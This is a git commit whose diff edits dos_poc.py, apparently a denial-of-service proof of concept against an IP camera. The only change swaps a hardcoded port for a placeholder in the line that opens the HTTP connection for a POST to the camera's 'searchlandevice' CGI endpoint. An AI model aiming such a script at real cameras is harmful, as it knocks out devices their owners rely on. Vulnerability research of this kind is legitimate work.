2807a46d366aa2a76e3d62dd154544bd296c29dd
Dreadlocked <gongl556@hotmail.com>
2018-01-30 15:33:15 +0000

    Update dos_poc.py

--- dos_poc.py
+++ dos_poc.py
@@ -21,7 +21,7 @@ headers = { "Host": "<YOUR_CAMERA_IP>:<PORT>",
 url = "/hy-cgi/device.cgi?cmd=searchlandevice"
 
 # POST the request
-conn = httplib.HTTPConnection(host,port=8083)
+conn = httplib.HTTPConnection(host,port=<YOUR_CAMERA_PORT>)
 conn.request("POST",url,params,headers)
 response = conn.getresponse()
 
